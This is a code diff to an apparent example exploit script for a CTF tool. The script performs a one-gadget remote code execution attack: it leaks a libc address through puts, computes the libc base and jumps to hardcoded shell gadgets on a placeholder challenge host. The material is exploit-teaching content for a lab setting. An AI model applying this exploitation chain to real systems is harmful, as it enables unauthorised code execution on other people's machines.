@@ -1,21 +1,21 @@
 # One-gadget RCE exploitation - quick shell with single address
 # Requires libc leak and meeting constraint conditions
 
-let binary = "./vuln"
-let host = "pwn.chal.ctf"
+let binary = "./vuln_binary"  # Compile from vuln.c in examples/
+let host = "pwn.chal.ctf"     # Replace with actual CTF target
 let port = 4444
 
 print("[*] One-Gadget RCE Exploitation")
 
 # Analyze binary
 let elf = analyze(binary)
-let plt_puts = elf.plt["puts"]
-let got_libc_start = elf.got["__libc_start_main"]
-let main_addr = elf.symbols["main"]
+let plt_puts = elf["plt"]["puts"]
+let got_libc_start = elf["got"]["__libc_start_main"]
+let main_addr = elf["symbols"]["main"]
 
 # Find gadgets
 let gadgets = quick_rop(binary)
-let pop_rdi = gadgets.find("pop rdi; ret")
+let pop_rdi = find(gadgets, "pop rdi; ret")
 
 print("[*] PLT/GOT addresses:")
 print("    puts@PLT:", hex(plt_puts))
@@ -33,17 +33,20 @@ let leaked = recv_until(conn, "\n")
 let leak = u64(leaked)
 print("[+] Leaked __libc_start_main:", hex(leak))
 
-# Calculate libc base
-let libc_base = leak - 0x21b10  # Adjust for your libc version
+# Calculate libc base dynamically
+let libc_template = Libc("ubuntu20.04")
+let libc_start_offset = libc_template["symbols"]["__libc_start_main"]
+let libc_base = leak - libc_start_offset
 print("[+] Libc base:", hex(libc_base))
 
-# One-gadget RCE offsets (use one_gadget tool to find these)
-# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
-let one_gadgets = [
-    libc_base + 0x4f3d5,  # Constraint: [rsp+0x40] == NULL
-    libc_base + 0x4f432,  # Constraint: [rsp+0x50] == NULL
-    libc_base + 0x10a41c  # Constraint: [rsp+0x70] == NULL
-]
+# One-gadget RCE offsets - calculate from libc database
+# Use one_gadget tool to find these for your libc version
+let libc_resolved = Libc({version: "ubuntu20.04", base: libc_base})
+let one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c]
+let one_gadgets = []
+for offset in one_gadget_offsets
+    push(one_gadgets, libc_base + offset)
+end
 
 print("[*] One-gadget addresses:")
 for i in range(len(one_gadgets))
